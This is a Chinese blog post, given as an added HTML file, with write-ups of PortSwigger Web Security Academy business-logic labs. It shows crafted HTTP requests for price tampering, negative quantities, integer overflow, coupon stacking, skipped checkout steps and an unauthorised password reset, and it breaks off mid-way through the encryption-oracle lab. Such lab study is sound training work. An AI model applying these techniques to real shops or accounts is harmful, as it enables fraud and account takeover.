@@ -1,0 +1,478 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width">
+<meta name="theme-color" content="#222"><meta name="generator" content="Hexo 7.3.0">
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.6.0/css/all.min.css" integrity="sha256-5eIC48iZUHmSlSUz9XtjRyK2mzQkHScZY1WdMaoz74E=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
+
+<script class="next-config" data-name="main" type="application/json">{"hostname":"secdroid.github.io","root":"/","images":"/images","scheme":"Pisces","darkmode":false,"version":"8.21.0","exturl":false,"sidebar":{"position":"left","width_expanded":320,"width_dual_column":240,"display":"post","padding":18,"offset":12},"hljswrap":true,"copycode":{"enable":false,"style":null},"fold":{"enable":false,"height":500},"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"}}</script><script src="/js/config.js"></script>
+
+    <meta name="description" content="0x01. PortSwigger Web Security AcademyPortSwigger Web Security Academy 是 Burp Suite 官方推出的免费 Web 安全学习靶场，在学习 Web 安全知识的同时，还可以练习 Burp Suite 的实战技能。 本篇文章讲解 Web Security Academy 之中的 Business Logic Vulnerabil">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Burp Web Academy Business Logic Vulnerabilities">
+<meta property="og:url" content="https://secdroid.github.io/2025/03/10/burp-web-academy-business-logic-vulnerabilities/index.html">
+<meta property="og:site_name" content="SecDroid">
+<meta property="og:description" content="0x01. PortSwigger Web Security AcademyPortSwigger Web Security Academy 是 Burp Suite 官方推出的免费 Web 安全学习靶场，在学习 Web 安全知识的同时，还可以练习 Burp Suite 的实战技能。 本篇文章讲解 Web Security Academy 之中的 Business Logic Vulnerabil">
+<meta property="og:locale" content="zh_CN">
+<meta property="article:published_time" content="2025-03-10T15:36:53.556Z">
+<meta property="article:modified_time" content="2025-03-09T08:35:56.000Z">
+<meta property="article:author" content="Livermore">
+<meta property="article:tag" content="Logic Vulnerability">
+<meta name="twitter:card" content="summary">
+
+
+<link rel="canonical" href="https://secdroid.github.io/2025/03/10/burp-web-academy-business-logic-vulnerabilities/">
+
+
+
+<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"zh-CN","comments":true,"permalink":"https://secdroid.github.io/2025/03/10/burp-web-academy-business-logic-vulnerabilities/","path":"2025/03/10/burp-web-academy-business-logic-vulnerabilities/","title":"Burp Web Academy Business Logic Vulnerabilities"}</script>
+
+<script class="next-config" data-name="calendar" type="application/json">""</script>
+<title>Burp Web Academy Business Logic Vulnerabilities | SecDroid</title>
+  
+
+
+
+
+
+
+
+
+  <noscript>
+    <link rel="stylesheet" href="/css/noscript.css">
+  </noscript>
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
+  <div class="headband"></div>
+
+  <main class="main">
+    <div class="column">
+      <header class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏" role="button">
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <i class="logo-line"></i>
+      <p class="site-title">SecDroid</p>
+      <i class="logo-line"></i>
+    </a>
+      <p class="site-subtitle" itemprop="description">A security researcher who's looking for a job</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger" aria-label="搜索" role="button">
+    </div>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  <ul class="main-menu menu"><li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a></li><li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a></li><li class="menu-item menu-item-categories"><a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a></li><li class="menu-item menu-item-tags"><a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a></li><li class="menu-item menu-item-links"><a href="/links/" rel="section"><i class="fa fa-link fa-fw"></i>链接</a></li><li class="menu-item menu-item-about"><a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a></li><li class="menu-item menu-item-sitemap"><a href="/sitemap.xml" rel="section"><i class="fa fa-sitemap fa-fw"></i>站点地图</a></li>
+  </ul>
+</nav>
+
+
+
+
+</header>
+        
+  
+  <aside class="sidebar">
+
+    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
+      <ul class="sidebar-nav">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <div class="sidebar-panel-container">
+        <!--noindex-->
+        <div class="post-toc-wrap sidebar-panel">
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#0x01-PortSwigger-Web-Security-Academy"><span class="nav-number">1.</span> <span class="nav-text">0x01. PortSwigger Web Security Academy</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x02-Business-Logic-Vulnerabilities"><span class="nav-number">2.</span> <span class="nav-text">0x02. Business Logic Vulnerabilities</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#2-1-Lab-Excessive-trust-in-client-side-controls"><span class="nav-number">2.1.</span> <span class="nav-text">2.1 Lab: Excessive trust in client-side controls</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-2-Lab-High-level-logic-vulnerability"><span class="nav-number">2.2.</span> <span class="nav-text">2.2 Lab: High-level logic vulnerability</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-3-Lab-Inconsistent-security-controls"><span class="nav-number">2.3.</span> <span class="nav-text">2.3 Lab: Inconsistent security controls</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-4-Lab-Flawed-enforcement-of-business-rules"><span class="nav-number">2.4.</span> <span class="nav-text">2.4 Lab: Flawed enforcement of business rules</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-5-Lab-Low-level-logic-flaw"><span class="nav-number">2.5.</span> <span class="nav-text">2.5 Lab: Low-level logic flaw</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-6-Lab-Inconsistent-handling-of-exceptional-input"><span class="nav-number">2.6.</span> <span class="nav-text">2.6 Lab: Inconsistent handling of exceptional input</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-7-Lab-Weak-isolation-on-dual-use-endpoint"><span class="nav-number">2.7.</span> <span class="nav-text">2.7 Lab: Weak isolation on dual-use endpoint</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-8-Lab-Insufficient-workflow-validation"><span class="nav-number">2.8.</span> <span class="nav-text">2.8 Lab: Insufficient workflow validation</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-9-Lab-Authentication-bypass-via-flawed-state-machine"><span class="nav-number">2.9.</span> <span class="nav-text">2.9 Lab: Authentication bypass via flawed state machine</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-10-Lab-Infinite-money-logic-flaw"><span class="nav-number">2.10.</span> <span class="nav-text">2.10 Lab: Infinite money logic flaw</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-11-Lab-Authentication-bypass-via-encryption-oracle"><span class="nav-number">2.11.</span> <span class="nav-text">2.11 Lab: Authentication bypass via encryption oracle</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x03-%E5%B0%8F%E7%BB%93"><span class="nav-number">3.</span> <span class="nav-text">0x03. 小结</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x04-Attack-models-in-cryptography"><span class="nav-number">4.</span> <span class="nav-text">0x04. Attack models in cryptography</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x05-%E5%8F%82%E8%80%83%E6%96%87%E6%A1%A3"><span class="nav-number">5.</span> <span class="nav-text">0x05. 参考文档</span></a></li></ol></div>
+        </div>
+        <!--/noindex-->
+
+        <div class="site-overview-wrap sidebar-panel">
+          <div class="site-author animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <p class="site-author-name" itemprop="name">Livermore</p>
+  <div class="site-description" itemprop="description">SecDroid's Diary</div>
+</div>
+<div class="site-state-wrap animated">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+        <a href="/archives/">
+          <span class="site-state-item-count">31</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+          <a href="/categories/">
+        <span class="site-state-item-count">10</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+          <a href="/tags/">
+        <span class="site-state-item-count">39</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+
+        </div>
+      </div>
+    </div>
+
+    
+  </aside>
+
+
+    </div>
+
+    <div class="main-inner post posts-expand">
+
+
+  
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://secdroid.github.io/2025/03/10/burp-web-academy-business-logic-vulnerabilities/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="Livermore">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="SecDroid">
+      <meta itemprop="description" content="SecDroid's Diary">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="Burp Web Academy Business Logic Vulnerabilities | SecDroid">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          Burp Web Academy Business Logic Vulnerabilities
+        </h1>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+
+      <time title="创建时间：2025-03-10 23:36:53" itemprop="dateCreated datePublished" datetime="2025-03-10T23:36:53+08:00">2025-03-10</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar-check"></i>
+      </span>
+      <span class="post-meta-item-text">更新于</span>
+      <time title="修改时间：2025-03-09 16:35:56" itemprop="dateModified" datetime="2025-03-09T16:35:56+08:00">2025-03-09</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">分类于</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/Vulnerability/" itemprop="url" rel="index"><span itemprop="name">Vulnerability</span></a>
+        </span>
+          ，
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/Vulnerability/Web/" itemprop="url" rel="index"><span itemprop="name">Web</span></a>
+        </span>
+          ，
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/Vulnerability/Web/Burp-Web-Academy/" itemprop="url" rel="index"><span itemprop="name">Burp Web Academy</span></a>
+        </span>
+    </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody"><h2 id="0x01-PortSwigger-Web-Security-Academy"><a href="#0x01-PortSwigger-Web-Security-Academy" class="headerlink" title="0x01. PortSwigger Web Security Academy"></a>0x01. PortSwigger Web Security Academy</h2><p>PortSwigger Web Security Academy 是 <a href="https://secdroid.github.io/tags/Burp/">Burp</a> Suite 官方推出的免费 Web 安全学习靶场，在学习 Web 安全知识的同时，还可以练习 Burp Suite 的实战技能。</p>
+<p>本篇文章讲解 <a href="https://secdroid.github.io/categories/Vulnerability/Web/Burp-Web-Academy/">Web Security Academy</a> 之中的 Business Logic Vulnerabilities。</p>
+<span id="more"></span>
+
+<h2 id="0x02-Business-Logic-Vulnerabilities"><a href="#0x02-Business-Logic-Vulnerabilities" class="headerlink" title="0x02. Business Logic Vulnerabilities"></a>0x02. Business Logic Vulnerabilities</h2><h3 id="2-1-Lab-Excessive-trust-in-client-side-controls"><a href="#2-1-Lab-Excessive-trust-in-client-side-controls" class="headerlink" title="2.1 Lab: Excessive trust in client-side controls"></a>2.1 Lab: Excessive trust in client-side controls</h3><blockquote>
+<p>This lab doesn’t adequately validate user input. You can exploit a logic flaw in its purchasing workflow to buy items for an unintended price. To solve the lab, buy a “Lightweight l33t leather jacket”.</p>
+<p>You can log in to your own account using the following credentials: <code>wiener:peter</code></p>
+</blockquote>
+<p>登录账号后加购物车，然后购买，发现加购物车是发送 POST 实现的：</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/cart</span> <span class="meta">HTTP/2</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>0a7a00030425eee0d8338edc0066006d.web-security-academy.net</span><br><span class="line"><span class="attribute">Cookie</span><span class="punctuation">: </span>session=266Xg2rp0gSz5wlRNEuyHPDjSCLsUUte</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>47</span><br><span class="line"><span class="attribute">Cache-Control</span><span class="punctuation">: </span>max-age=0</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/x-www-form-urlencoded</span><br><span class="line"></span><br><span class="line"><span class="language-apache"><span class="attribute">productId</span>=<span class="number">1</span>&amp;redir=PRODUCT&amp;quantity=<span class="number">1</span>&amp;price=<span class="number">133700</span></span></span><br></pre></td></tr></table></figure>
+
+<p>清空购物车，修改 <code>price</code> 后重新添加，即可修改物品金额。</p>
+<h3 id="2-2-Lab-High-level-logic-vulnerability"><a href="#2-2-Lab-High-level-logic-vulnerability" class="headerlink" title="2.2 Lab: High-level logic vulnerability"></a>2.2 Lab: High-level logic vulnerability</h3><blockquote>
+<p>This lab doesn’t adequately validate user input. You can exploit a logic flaw in its purchasing workflow to buy items for an unintended price. To solve the lab, buy a “Lightweight l33t leather jacket”.</p>
+<p>You can log in to your own account using the following credentials: <code>wiener:peter</code></p>
+</blockquote>
+<p>同样是 POST 添加购物车，发现可以把物品个数修改为负数，但是购物时需要结算金额大于 <code>0</code>。</p>
+<p>所以，可以通过添加其他物品（负数个数），控制结算价格在余额范围内即可。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">productId=16&amp;redir=PRODUCT&amp;quantity=-14</span><br><span class="line"></span><br><span class="line">&gt;&gt;&gt; 91.11*14</span><br><span class="line">1275.54</span><br><span class="line">&gt;&gt;&gt; 1337-1275</span><br><span class="line">62</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/cart</span> <span class="meta">HTTP/2</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>0a8d0067036f545183d6c8c400120052.web-security-academy.net</span><br><span class="line"><span class="attribute">Cookie</span><span class="punctuation">: </span>session=sqOtXBUIfkBzo4L04ncwYNxAXnoZkfDO</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>36</span><br><span class="line"><span class="attribute">Cache-Control</span><span class="punctuation">: </span>max-age=0</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/x-www-form-urlencoded</span><br><span class="line"></span><br><span class="line"><span class="language-apache"><span class="attribute">productId</span>=<span class="number">1</span>&amp;redir=PRODUCT&amp;quantity=<span class="number">1</span></span></span><br></pre></td></tr></table></figure>
+
+<h3 id="2-3-Lab-Inconsistent-security-controls"><a href="#2-3-Lab-Inconsistent-security-controls" class="headerlink" title="2.3 Lab: Inconsistent security controls"></a>2.3 Lab: Inconsistent security controls</h3><blockquote>
+<p>This lab’s flawed logic allows arbitrary users to access administrative functionality that should only be available to company employees. To solve the lab, access the admin panel and delete the user <code>carlos</code>.</p>
+</blockquote>
+<p>访问 <code>/admin</code>，提示 <code>Admin interface only available if logged in as a DontWannaCry user</code>。</p>
+<p>先注册账号，登陆后把自己的邮箱修改为 <code>@DontWannaCry.com</code> 即可。</p>
+<h3 id="2-4-Lab-Flawed-enforcement-of-business-rules"><a href="#2-4-Lab-Flawed-enforcement-of-business-rules" class="headerlink" title="2.4 Lab: Flawed enforcement of business rules"></a>2.4 Lab: Flawed enforcement of business rules</h3><blockquote>
+<p>This lab has a logic flaw in its purchasing workflow. To solve the lab, exploit this flaw to buy a “Lightweight l33t leather jacket”.</p>
+<p>You can log in to your own account using the following credentials: <code>wiener:peter</code></p>
+</blockquote>
+<p>页面顶部有一个优惠码：<code>New customers use code at checkout: NEWCUST5</code>，可以优惠五块。</p>
+<p>页面底部有一个订阅功能，订阅后提示：<code>Use coupon SIGNUP30 at checkout!</code>，可以打七折。</p>
+<p>间隔输入这两个优惠码，可以持续优惠（注意不可以一致重复提交一个优惠码）。</p>
+<p>尝试过随机爆破优惠码，但不可行。</p>
+<h3 id="2-5-Lab-Low-level-logic-flaw"><a href="#2-5-Lab-Low-level-logic-flaw" class="headerlink" title="2.5 Lab: Low-level logic flaw"></a>2.5 Lab: Low-level logic flaw</h3><blockquote>
+<p>This lab doesn’t adequately validate user input. You can exploit a logic flaw in its purchasing workflow to buy items for an unintended price. To solve the lab, buy a “Lightweight l33t leather jacket”.</p>
+<p>You can log in to your own account using the following credentials: <code>wiener:peter</code></p>
+</blockquote>
+<p>看起来底层是用 <code>int32</code> 来计算购物车金额的，所以持续添加物品，可以让整数溢出。再适当调整购物车的物品，可以让余额在 <code>0 - 100</code> 之间。注意不能是负数，负数不让提交。</p>
+<p>因为单个物品一次提交最多 <code>99</code> 个，所以涉及到在 Burp 中如何快速重复发送 HTTP 请求的问题。在 <a href="https://secdroid.github.io/tags/Burp-Intruder/">Burp Intruder</a> 中，先清除所有标记，然后将 Payload type 设置为 <strong>Null Payloads</strong>，即可在 Payload options 中指定 Generate 多少个 payload。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">pow</span>(<span class="number">2</span>,<span class="number">31</span>)</span><br><span class="line"><span class="number">2147483648</span></span><br></pre></td></tr></table></figure>
+
+<p>看到 <code>214748...</code> 就应该联想到 <code>int32</code>。</p>
+<h3 id="2-6-Lab-Inconsistent-handling-of-exceptional-input"><a href="#2-6-Lab-Inconsistent-handling-of-exceptional-input" class="headerlink" title="2.6 Lab: Inconsistent handling of exceptional input"></a>2.6 Lab: Inconsistent handling of exceptional input</h3><blockquote>
+<p>This lab doesn’t adequately validate user input. You can exploit a logic flaw in its account registration process to gain access to administrative functionality. To solve the lab, access the admin panel and delete the user <code>carlos</code>.</p>
+</blockquote>
+<p>参考官方解答，有点开脑洞：利用子域名和字符串截断伪造一个指定后缀的邮箱地址。</p>
+<p>首先，使用超长的邮箱注册一个账户，激活后登录，发现用户中心邮件地址被截断了，邮箱长度最大 <code>255</code>。因此，可以构造 <code>xxxx...xxxx@dontwannacry.com.exploit-0a75002d04f7595e80cec5ba011500f9.exploit-server.net</code>，只需要确保截断后后缀为 <code>@dontwannacry.com</code> 即可。</p>
+<h3 id="2-7-Lab-Weak-isolation-on-dual-use-endpoint"><a href="#2-7-Lab-Weak-isolation-on-dual-use-endpoint" class="headerlink" title="2.7 Lab: Weak isolation on dual-use endpoint"></a>2.7 Lab: Weak isolation on dual-use endpoint</h3><blockquote>
+<p>This lab makes a flawed assumption about the user’s privilege level based on their input. As a result, you can exploit the logic of its account management features to gain access to arbitrary users’ accounts. To solve the lab, access the <code>administrator</code> account and delete the user <code>carlos</code>.</p>
+<p>You can log in to your own account using the following credentials: <code>wiener:peter</code></p>
+</blockquote>
+<p>在修改密码界面，需要提交如下四个字段：</p>
+<ul>
+<li>用户名</li>
+<li>当前密码</li>
+<li>新密码</li>
+<li>确认新密码</li>
+</ul>
+<p>尝试修改 <code>administrator</code> 的密码，提示当前密码不对。换个思路，如果管理员要重置一个人的密码，很可能并不知道原始密码，但是管理员需要有这个权限。所以尝试不填写当前密码，但是会提示这是必填字段。因此，修改 POST 发包参数：</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/my-account/change-password</span> <span class="meta">HTTP/2</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>0aa60065041898098192666e00760099.web-security-academy.net</span><br><span class="line"><span class="attribute">Cookie</span><span class="punctuation">: </span>session=Bog7qBvvvb0wubZIxpAqPG1YC4xqOHzd</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>97</span><br><span class="line"><span class="attribute">Cache-Control</span><span class="punctuation">: </span>max-age=0</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/x-www-form-urlencoded</span><br><span class="line"></span><br><span class="line"><span class="language-apache"><span class="attribute">csrf</span>=<span class="number">0</span>PyaHO6Fj0Q9ZkWHvBjyiEZvHVB76hYN&amp;username=carlos&amp;new-password-<span class="number">1</span>=<span class="number">123456</span>&amp;new-password-<span class="number">2</span>=<span class="number">123456</span></span></span><br></pre></td></tr></table></figure>
+
+<p>成功修改了 <code>carlos</code> 的密码，并可登录。然后，普通用户没法删除自身，所以，尝试修改 <code>administrator</code> 的密码，登陆后删除 <code>carlos</code> 即可。</p>
+<h3 id="2-8-Lab-Insufficient-workflow-validation"><a href="#2-8-Lab-Insufficient-workflow-validation" class="headerlink" title="2.8 Lab: Insufficient workflow validation"></a>2.8 Lab: Insufficient workflow validation</h3><blockquote>
+<p>This lab makes flawed assumptions about the sequence of events in the purchasing workflow. To solve the lab, exploit this flaw to buy a “Lightweight l33t leather jacket”.</p>
+<p>You can log in to your own account using the following credentials: <code>wiener:peter</code></p>
+</blockquote>
+<p>看题目意思可能是可以条件竞争，不过不太知道怎么在 Burp 中操作，参考接替答案，发现不是条件竞争。</p>
+<p>购物完成后，会跳转到 <code>/cart/order-confirmation?order-confirmed=true</code>，因此，尝试加购物车后直接访问该页面即可：</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/cart/order-confirmation?order-confirmed=true</span> <span class="meta">HTTP/2</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>0af700ff04dd05e0896cae71005800ab.web-security-academy.net</span><br><span class="line"><span class="attribute">Cookie</span><span class="punctuation">: </span>session=7AYnLSy13zE91c8izvCJZFFWuTnCqiXP</span><br><span class="line"><span class="attribute">Cache-Control</span><span class="punctuation">: </span>max-age=0</span><br></pre></td></tr></table></figure>
+
+<h3 id="2-9-Lab-Authentication-bypass-via-flawed-state-machine"><a href="#2-9-Lab-Authentication-bypass-via-flawed-state-machine" class="headerlink" title="2.9 Lab: Authentication bypass via flawed state machine"></a>2.9 Lab: Authentication bypass via flawed state machine</h3><blockquote>
+<p>This lab makes flawed assumptions about the sequence of events in the login process. To solve the lab, exploit this flaw to bypass the lab’s authentication, access the admin interface, and delete the user <code>carlos</code>.</p>
+<p>You can log in to your own account using the following credentials: <code>wiener:peter</code></p>
+</blockquote>
+<p>登陆后会有一个角色选择，尝试将角色修改为 <code>admin</code> 或者 <code>administrator</code> 都没有效果。而 <code>/admin</code> 只有管理员才可以访问。看了官方题解，把角色选择的请求拦截掉即可。注意，登陆后会重定向到 <code>/role-selector</code>，不要发出这个请求，因此登录前就要开启拦截功能。</p>
+<h3 id="2-10-Lab-Infinite-money-logic-flaw"><a href="#2-10-Lab-Infinite-money-logic-flaw" class="headerlink" title="2.10 Lab: Infinite money logic flaw"></a>2.10 Lab: Infinite money logic flaw</h3><blockquote>
+<p>This lab has a logic flaw in its purchasing workflow. To solve the lab, exploit this flaw to buy a “Lightweight l33t leather jacket”.</p>
+<p>You can log in to your own account using the following credentials: <code>wiener:peter</code></p>
+</blockquote>
+<p>题目有两个值得关注的功能：</p>
+<ul>
+<li>底部订阅功能，可以得到一个七折优惠码 <code>SIGNUP30</code></li>
+<li>商品列表有一个 10 块的礼品卡可以购买</li>
+<li>礼品卡购买后可以充值到账户</li>
+</ul>
+<p>利用上面的功能组合，可以无限膨胀金额。充值礼品卡可以使用 <a href="https://secdroid.github.io/tags/Burp-Intruder/">Burp Intruder</a>，不用一个一个手工充值。</p>
+<h3 id="2-11-Lab-Authentication-bypass-via-encryption-oracle"><a href="#2-11-Lab-Authentication-bypass-via-encryption-oracle" class="headerlink" title="2.11 Lab: Authentication bypass via encryption oracle"></a>2.11 Lab: Authentication bypass via encryption oracle</h3><blockquote>
+<p>This lab contains a logic flaw that exposes an encryption oracle to users. To solve the lab, exploit this flaw to gain access to the admin panel and delete the user <code>carlos</code>.</p>
+<p>You can log in to your own account using the following credentials: <code>wiener:peter</code></p>
+</blockquote>
+<p>所谓 Encryption Oracle，即<strong>加密预言机</strong>，攻击者能接触到一个黑盒，他可以任意输入明文并输出密文，但是攻击者对黑盒的内部构造一无所知。</p>
+<p>首先，登录时有个 <code>Stay logged in</code> 选项，选中并登录后，会生成一个 Cookie 用来保持登录态。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">stay-logged-in=k%2fhROkc31%2fF5Uz9SeehfGRaYG%2bX1izvb4Nyt0XLSt5E%3d</span><br></pre></td></tr></table></figure>
+
+<p>在评论时如果提交不合法的 Email 地址，比如 <code>testATgmail.com</code>，会提示 <code>Invalid email address: testATgmail.com</code>。</p>
+<p>正常的评论 HTTP Response Header：</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">HTTP/2</span> <span class="number">302</span> Found</span><br><span class="line"><span class="attribute">Location</span><span class="punctuation">: </span>/post/comment/confirmation?postId=2</span><br><span class="line"><span class="attribute">X-Frame-Options</span><span class="punctuation">: </span>SAMEORIGIN</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>0</span><br></pre></td></tr></table></figure>
+
+<p>使用不合法 Email 提交评论后的 HTTP Response Header：</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">HTTP/2</span> <span class="number">302</span> Found</span><br><span class="line"><span class="attribute">Location</span><span class="punctuation">: </span>/post?postId=2</span><br><span class="line"><span class="attribute">Set-Cookie</span><span class="punctuation">: </span>notification=jUYPViaXrK%2bv25jVI4zHooaWhSYGYDgSjW3g3DGHxpH03LY%2bSlAO16cu4037CYxA; HttpOnly</span><br><span class="line"><span class="attribute">X-Frame-Options</span><span class="punctuation">: </span>SAMEORIGIN</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>0</span><br></pre></td></tr></table></figure>
+
+<p>重定向之后的请求：</p>
